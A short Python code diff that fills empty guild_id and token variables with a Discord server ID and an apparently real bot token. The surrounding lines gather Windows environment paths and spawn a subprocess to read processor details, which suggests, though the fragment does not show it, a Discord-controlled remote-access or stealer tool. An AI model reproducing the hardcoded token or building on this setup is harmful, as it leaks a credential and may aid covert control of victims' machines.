@@ -7,8 +7,8 @@ APPDATA = os.getenv("APPDATA")
 LOCALAPPDATA = os.getenv("LOCALAPPDATA")
 TEMP = os.getenv("TEMP")
 
-guild_id = ""
-token = ""
+guild_id = "1193179117013708852"
+token = "MTE5MzE3NzM2OTk4NTQyMTQ1NA.GnRKZ2.qVEh4NI920LmbOuCesFCSYo0YHtafRO7s_cHpA"
 
 def get_processor():
     stdout = subprocess.Popen(
